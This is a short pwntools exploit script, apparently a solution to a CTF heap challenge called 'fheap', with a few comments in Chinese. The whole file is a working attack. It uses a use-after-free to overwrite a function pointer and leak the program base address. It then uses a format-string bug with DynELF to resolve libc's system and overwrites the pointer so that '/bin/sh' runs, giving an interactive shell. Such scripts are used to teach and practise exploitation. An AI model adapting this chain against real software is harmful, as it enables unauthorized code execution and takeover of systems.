from pwn import *

proc = process('./fheap')

# 开启
puts_addr_offset = 0x35b
printf_plt_offset = 0x090

elf = ELF("./fheap")
libc = ELF("/usr/lib32/libc.so.6")

def create(size, content):
    proc.recvuntil(b"3.quit\n")
    proc.sendline(b"create ")
    proc.recvuntil(b"size:")
    proc.sendline(str(size).encode())
    proc.recvuntil(b"str:")
    proc.send(content)

def delete(id):
    proc.recvuntil(b"3.quit\n")
    proc.sendline(b"delete ")
    proc.recvuntil(b"id:")
    proc.sendline(str(id).encode())
    proc.recvuntil(b"sure?:")
    proc.sendline(b"yes")


# UAF
create(8, b'A' * 8)
create(8, b'B' * 8)
delete(1)
delete(0)

p = flat([b'A' * 0x18, p64(puts_addr_offset)[0]])
create(len(p), p)
delete(1)

proc.recvuntil(b'A' * 0x18)

real_puts_addr = u64(proc.recv(6).ljust(8,b'\x00')) 
proc_base_addr = real_puts_addr - puts_addr_offset
printf_plt_addr = proc_base_addr + printf_plt_offset
delete(0)

print("real_puts_addr: %x" % real_puts_addr)
print("proc_base_addr: %x" % proc_base_addr)
print("printf_plt_addr: %x" % printf_plt_addr)

def leak_addr(addr):
    # 将addr放置在栈上，然后利用格式化字符串漏洞，将addr所对地址读取并打印出来
    pattern = "addr%7$s"
    p = pattern.encode() + b'#'*(0x18 - len(pattern)) + p64(printf_plt_addr)
    create(len(p), p)

    proc.recvuntil(b"3.quit")
    proc.sendline(b"delete string")
    proc.recvuntil(b"Pls give me the string id you want to delete\nid:")
    proc.sendline(b"1")
    proc.recvuntil(b"Are you sure?:")
    # 补足8byte
    proc.sendline(b"yesxxxxx" + p64(addr))
    proc.recvuntil(b"addr")
    data = proc.recvuntil(b'####')[:-4]

    delete(0)
    return data + b'\x00'

d = DynELF(leak_addr, proc_base_addr, elf=elf)
system_addr = d.lookup('system','libc')
print("system_addr: %x" % system_addr)

p = b'/bin/sh;' + b'#' * (0x18-len('/bin/sh;')) + p64(system_addr)
create(len(p), p)
delete(1)
proc.interactive()







